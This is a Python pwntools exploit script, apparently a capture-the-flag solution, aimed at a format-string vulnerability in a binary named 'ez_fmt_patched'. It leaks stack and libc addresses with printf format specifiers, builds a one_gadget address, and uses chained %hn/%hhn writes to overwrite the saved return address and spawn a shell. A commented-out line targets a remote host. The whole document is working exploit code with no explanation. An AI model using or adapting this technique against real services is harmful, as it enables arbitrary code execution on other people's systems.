#!/usr/bin/python3

oneGadget_offset = 0xe3b01
stack_sub = 0x2e
'''
03:0018│                0x7ffcbf4b3058 —▸ 0x7ffcbf4b3087 ◂— 0x5574fc5f910000
04:0020│                0x7ffcbf4b3060 —▸ 0x7ffcbf4b3086 ◂— 0x5574fc5f91000000
'''
stack_offset = 0x158
offset__libc_start_main243 = 0x24083
x = 0

from pwn import *

elf = ELF("./ez_fmt_patched")
p = elf.process()
libc = ELF("./libc.so.6")
# p = remote("192.81.209.60", "2022")
# gdb.attach(p, '''b *main+112''')

def splitString(s, x):
    num = int(x)
    split_string= [s[i:i+num] for i in range(0, len(s), num)]
    return split_string

def write(addr, value):	# addr - int ; value - int
	addr = str(hex(addr))
	addr = addr[-4:]
	addr = int(addr, 16) 

	value = str(hex(value))
	value = splitString(value, 2)
	value.insert(1, '00')
	value.insert(1, '00')
	value.remove('0x')
	print(value)

	for i in range (8):
		pad = f'%{addr + i}c%21$hn'.encode()
		# sleep(x)
		p.sendline(pad)

		val = int(value[8 - 1 - i], 16)
		if val == 0: 
			break;
		pad1 = f'%{val}c%49$hhn'.encode()
		# sleep(x)
		p.sendline(pad1)
	return

p.recvuntil(b'Service :##\n')
# 21 - 49 | stack - pointer stack
# start stack is para 6

pl = b'%*10$'
p.sendline(pl)

leak = p.recvline()
if b'-' in leak:
	log.critical("Leak Fail!!!")
	p.close()

data = int(leak[1:-1])
log.success("4 byte in stack para 10: " + hex(data))
data = data - stack_sub
log.success("4 start char \"0x0a\": " + hex(data))
last_byte = data & 0xff
last_byte += 3
log.info("Byte start char \"0x0a\": " + hex(last_byte))
data += 8
log.success("Addr stack para 10(4 byte): " + hex(data))
two_byte = data & 0xffff
log.info("2 byte para 10: " + hex(two_byte))

# Write byte use pointer 21 - 49
pl = f'%{two_byte}c%21$hn'.encode()
p.sendline(pl)

pl = f'%{last_byte}c%49$hhn'.encode()
p.sendline(pl)

# leak Stack - 21
pl = b'%c%c%c%c%c%c%c%c%104c%n%21$'
p.sendline(pl)

sleep(1)
p.recvuntil(b'0x')
leak = p.recv(12)
leak = int(leak, 16)
rsp = leak - stack_offset
log.info("\"RSP\": " + hex(rsp))

return_printf = rsp - 8
log.info("Addr stack return printf: " + hex(return_printf))

# leak Libc - 19
pl = b'%c%c%c%c%c%c%c%c%104c%n%19$'
p.sendline(pl)

p.recvuntil(b'0x')
leak = p.recv(12)
leak = int(leak, 16)
libc_base = leak - offset__libc_start_main243
log.info("Libc base: " + hex(libc_base))
one_gadget = libc_base + oneGadget_offset
log.info("Addr one_gadget: "  + hex(one_gadget))

one_gadget = str(hex(one_gadget))
one_gadget = one_gadget.split('0x')
one_gadget = splitString(one_gadget[1], 4)
one_gadget[0] = "2" + one_gadget[0]
one_gadget[1] = "1" + one_gadget[1]

one = int(one_gadget[2], 16)
two = int(one_gadget[1], 16)
three = int(one_gadget[0], 16)

print(one_gadget)
print(one, two, three)

log.info("rsp - 8: " + hex(rsp + 0x40))
log.info("rsp - 6: " + hex(rsp + 0xb0))
log.info("rsp - 4: " + hex(rsp + 0xb8))

write(rsp + 0x40, rsp - 8)
write(rsp + 0xb0, rsp - 6)
write(rsp + 0xb8, rsp - 4)

# 14 - 28 - 29
payload = f'%{one}c%14$hn%{two - one}c%28$hn%{three - two}c%29$hn'.encode()
p.sendline(payload)


p.interactive() 





